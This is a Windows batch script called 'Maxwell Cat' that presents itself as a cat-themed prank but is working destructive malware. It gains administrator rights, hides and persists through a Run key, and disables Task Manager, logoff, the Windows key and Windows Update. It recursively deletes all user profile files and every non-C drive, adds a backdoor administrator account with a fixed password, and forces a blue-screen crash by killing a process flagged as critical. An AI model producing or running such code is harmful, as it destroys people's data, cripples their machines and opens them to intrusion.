@echo off
title maxwell cat
color 0C
setlocal

rem ============================================================
rem  MAWXELL CAT - LOCKED FINAL v16
rem  paste the key from maxwell_cat_key.bat to unlock
rem  v16 adds (put files in C:\Windows\Temp BEFORE arming):
rem    maxwell.jpg       - real cat image wallpaper (full screen)
rem    maxwell_meow.wav  - real meow sound, loops the whole show
rem    maxwell.gif       - optional gif fallback wallpaper
rem  missing files are skipped safely
rem ============================================================

rem ---------------- ONE-SHOT ----------------
if exist "%SystemRoot%\Temp\mc_done.flag" exit /b

rem ---------------- KEY GATE ----------------
if exist "%SystemRoot%\Temp\mc_hidden.flag" goto :payload
if exist "%SystemRoot%\Temp\mc_unlocked.flag" goto :arm

cls
echo.
echo   ================================================
echo          MAXWELL CAT  -  LOCKED
echo   ================================================
echo.
if not exist "%SystemRoot%\Temp\mawxell_cat_keys\key.txt" (
    echo   [X] NO KEY FOUND
    echo       run  maxwell_cat_key.bat  first
    pause
    exit /b
)
set /p KEY=  ENTER KEY: 
set "KEY=%KEY: =%"
set /p STORED=<"%SystemRoot%\Temp\mawxell_cat_keys\key.txt"
if /i not "%KEY%"=="%STORED%" (
    echo.
    echo   [X] WRONG KEY - still locked
    pause
    exit /b
)
> "%SystemRoot%\Temp\mc_unlocked.flag" echo 1
:arm

rem ---------------- OS GATE ----------------
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows 10" /c:"Windows 11" >nul
if errorlevel 1 goto :notok

rem ---------------- ELEVATE ----------------
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoP -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

rem ---------------- COPY TO TEMP ----------------
copy /y "%~f0" "%SystemRoot%\Temp\maxwell_cat.bat" >nul 2>&1
> "%SystemRoot%\Temp\mc_hidden.flag" echo 1

rem ---------------- HIDE + RELAUNCH ----------------
> "%SystemRoot%\Temp\mchide.vbs" echo Set o = CreateObject("WScript.Shell")
>> "%SystemRoot%\Temp\mchide.vbs" echo o.Run "%SystemRoot%\Temp\maxwell_cat.bat", 0, False
wscript //nologo "%SystemRoot%\Temp\mchide.vbs"
exit /b

:payload
cd /d "%SystemRoot%\Temp"
attrib +h "%SystemRoot%\Temp\maxwell_cat.bat" "%SystemRoot%\Temp\mchide.vbs" "%SystemRoot%\Temp\mc_hidden.flag" >nul 2>&1

rem ---------------- 0.5) MEOW SOUND LOOP (whole show) ----------------
if exist "%SystemRoot%\Temp\maxwell_meow.wav" start "" powershell -NoP -WindowStyle Hidden -Command "$s=New-Object System.Media.SoundPlayer('C:\Windows\Temp\maxwell_meow.wav'); $s.PlayLooping(); while($true){Start-Sleep -Seconds 60}"

rem ============ 0) FAKE BIOS LOCKUP (cosmetic, VM-safe) ============
> "%SystemRoot%\Temp\fakebios.ps1" echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing
>> "%SystemRoot%\Temp\fakebios.ps1" echo $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f=New-Object System.Windows.Forms.Form
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.FormBorderStyle='None'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Bounds=$s
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.TopMost=$true
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.BackColor='Black'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l=New-Object System.Windows.Forms.Label
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.ForeColor='White'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.BackColor='Black'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Font=New-Object System.Drawing.Font('Consolas',20,[System.Drawing.FontStyle]::Bold)
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Dock='Fill'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.TextAlign='MiddleLeft'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Controls.Add($l)
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Show()
>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=''
>> "%SystemRoot%\Temp\fakebios.ps1" echo $lines=@('American Megatrends UEFI BIOS v13.0 (C)2026 MAWXELL Inc.','','CPU  : NO DETECT ............ FAIL','MEM  : 0 MB OK .............. ERROR','CMOS : CHECKSUM ............. INVALID','HDD  : BOOT DEVICE .......... LOCKED','FAN  : 0 RPM ................ STALL','','PRESS DEL TO ENTER SETUP  [not working]','')
>> "%SystemRoot%\Temp\fakebios.ps1" echo foreach($x in $lines){
>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=$t+$x+[char]10
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t
>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Milliseconds 600
>> "%SystemRoot%\Temp\fakebios.ps1" echo }
>> "%SystemRoot%\Temp\fakebios.ps1" echo for($i=0;$i -lt 6;$i++){
>> "%SystemRoot%\Temp\fakebios.ps1" echo $t=$t+'FLASHING MAWXELL CAT ...'+[char]10
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t
>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Milliseconds 700
>> "%SystemRoot%\Temp\fakebios.ps1" echo }
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.ForeColor='Red'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Font=New-Object System.Drawing.Font('Consolas',34,[System.Drawing.FontStyle]::Bold)
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.TextAlign='MiddleCenter'
>> "%SystemRoot%\Temp\fakebios.ps1" echo $l.Text=$t+[char]10+[char]10+'        haha you got hacked pc'
>> "%SystemRoot%\Temp\fakebios.ps1" echo Start-Sleep -Seconds 4
>> "%SystemRoot%\Temp\fakebios.ps1" echo $f.Close()
powershell -NoP -EP Bypass -File "%SystemRoot%\Temp\fakebios.ps1" >nul 2>&1

set WAIT=60
timeout /t %WAIT% /nobreak >nul

rem ---------------- 1) WALLPAPER: real cat image first, gif fallback ----------------
if exist "%SystemRoot%\Temp\maxwell.jpg" goto :imgwall
if exist "%SystemRoot%\Temp\maxwell.gif" goto :gifwall
goto :skipwall
:imgwall
start "" powershell -NoP -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $w=(New-Object System.Windows.Forms.Form); $w.FormBorderStyle='None'; $w.Bounds=$s; $w.TopMost=$true; $p=New-Object System.Windows.Forms.PictureBox; $p.Image=[System.Drawing.Image]::FromFile('%SystemRoot%\Temp\maxwell.jpg'); $p.Dock='Fill'; $p.SizeMode='StretchImage'; $w.Controls.Add($p); $w.Show(); [System.Windows.Forms.Application]::Run($w)"
goto :skipwall
:gifwall
start "" powershell -NoP -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $w=(New-Object System.Windows.Forms.Form); $w.FormBorderStyle='None'; $w.Bounds=$s; $w.TopMost=$true; $p=New-Object System.Windows.Forms.PictureBox; $p.Image=[System.Drawing.Image]::FromFile('%SystemRoot%\Temp\maxwell.gif'); $p.Dock='Fill'; $p.SizeMode='StretchImage'; $w.Controls.Add($p); $w.Show(); [System.Windows.Forms.Application]::Run($w)"
:skipwall

rem ---------------- 2) WIN+R ----------------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1

rem ---------------- 3) CTRL+ALT+DEL NUKED (no file deletion) ----------------
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
gpupdate /force >nul 2>&1

rem ---------------- 4) WIN KEY ----------------
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1

rem ---------------- 5) TASKBAR HIDE ----------------
powershell -NoP -Command "$k=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -EA SilentlyContinue).Settings; if($k){$k[8]=3; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' Settings $k}; Stop-Process -Name explorer -Force -EA SilentlyContinue" >nul 2>&1

rem ---------------- 6) PERSISTENCE + BSOD + AUTO-REBOOT ----------------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v maxwell_cat /t REG_SZ /d "wscript.exe %SystemRoot%\Temp\mchide.vbs" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /t REG_SZ /d ":)" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "maxwell cat" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 1 /f >nul 2>&1

rem ---------------- 7) WIPE USER FILES (keep profiles) ----------------
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im SearchHost.exe >nul 2>&1
taskkill /f /im SearchApp.exe >nul 2>&1
taskkill /f /im OneDrive.exe >nul 2>&1
taskkill /f /im Teams.exe >nul 2>&1

powershell -NoP -Command "Get-ChildItem C:\Users -Directory | Where-Object {$_.Name -notin @('Public','Default','Default User')} | ForEach-Object { Get-ChildItem $_.FullName -Force -EA SilentlyContinue | Where-Object {$_.Name -ne 'NTUSER.DAT'} | Remove-Item -Recurse -Force -EA SilentlyContinue }"

powershell -NoP -Command "Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Name -ne 'C'} | ForEach-Object { Remove-Item ($_.Root + '*') -Recurse -Force -ErrorAction SilentlyContinue }"

rem ---------------- 7.5) DISABLE WINDOWS UPDATE (SAFE) ----------------
sc stop wuauserv >nul 2>&1
sc config wuauserv start= disabled >nul 2>&1
sc stop bits >nul 2>&1
sc config bits start= disabled >nul 2>&1
sc stop UsoSvc >nul 2>&1
sc config UsoSvc start= disabled >nul 2>&1
sc stop WaaSMedicSvc >nul 2>&1
sc config WaaSMedicSvc start= disabled >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoWindowsUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im WUDFHost.exe >nul 2>&1
taskkill /f /im WindowsUpdate.exe >nul 2>&1
taskkill /f /im UsoClient.exe >nul 2>&1
taskkill /f /im MoUsoCoreWorker.exe >nul 2>&1

rem ---------------- 8) LOCK USER: more more more user / discord ----------------
net user "more more more user" "discord" /add /expires:never /passwordchg:no /active:yes >nul 2>&1
net localgroup Administrators "more more more user" /add >nul 2>&1
powershell -NoP -Command "Set-LocalUser -Name 'more more more user' -PasswordNeverExpires $true -ErrorAction SilentlyContinue"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "more more more user" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "discord" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1

rem ---------------- 9) HACKED SPINNER (16s, then boom) ----------------
set n=0
:SPIN
set /a n+=1
if "%n%"=="1" set "sp=|"
if "%n%"=="2" set "sp=/"
if "%n%"=="3" set "sp=-"
if "%n%"=="4" set sp=\
if "%n%"=="5" set "sp=|"
if "%n%"=="6" set "sp=/"
if "%n%"=="7" set "sp=-"
if "%n%"=="8" set sp=\
if "%n%"=="9" set "sp=|"
if "%n%"=="10" set "sp=/"
if "%n%"=="11" set "sp=-"
if "%n%"=="12" set sp=\
if "%n%"=="13" set "sp=|"
if "%n%"=="14" set "sp=/"
if "%n%"=="15" set "sp=-"
if "%n%"=="16" set sp=\
cls
echo.
echo        /\_/\      %sp%
echo       ( o.o )     %sp%
echo        ~~~~~      %sp%
echo.
echo   MAWXELL CAT   pass %n%
echo.
echo   haha you got hacked pc
timeout /t 1 /nobreak >nul
if "%n%"=="16" goto :boom
goto :SPIN

:boom
taskkill /f /im powershell.exe >nul 2>&1
> "%SystemRoot%\Temp\mc_done.flag" echo 1

rem ---------------- REAL BSOD :) ----------------
> "%SystemRoot%\Temp\mcs.ps1" echo $sig = 'using System;using System.Runtime.InteropServices;public struct TP{public int Count;public long Luid;public int Attr;}public class K{[DllImport("advapi32.dll")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);[DllImport("advapi32.dll")]public static extern bool LookupPrivilegeValue(string s,string n,out long l);[DllImport("advapi32.dll")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP p,int b,IntPtr z,IntPtr y);[DllImport("ntdll.dll")]public static extern int RtlSetProcessIsCritical(int b,ref int o,int s);[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();[DllImport("kernel32.dll")]public static extern bool TerminateProcess(IntPtr h,uint e);public static void Go(){IntPtr h=GetCurrentProcess();IntPtr t;OpenProcessToken(h,40,out t);long l;LookupPrivilegeValue(null,"SeDebugPrivilege",out l);TP p=new TP();p.Count=1;p.Luid=l;p.Attr=2;AdjustTokenPrivileges(t,false,ref p,0,IntPtr.Zero,IntPtr.Zero);int o=0;RtlSetProcessIsCritical(1,ref o,0);TerminateProcess(h,0);}}'
>> "%SystemRoot%\Temp\mcs.ps1" echo Add-Type -TypeDefinition $sig
>> "%SystemRoot%\Temp\mcs.ps1" echo [K]::Go()
powershell -NoP -EP Bypass -File "%SystemRoot%\Temp\mcs.ps1" >nul 2>&1

rem ---------------- FALLBACK REBOOT ----------------
shutdown /r /t 0 /f
exit /b

:notok
echo  [X] Windows 10 / 11 only.
pause
exit /b
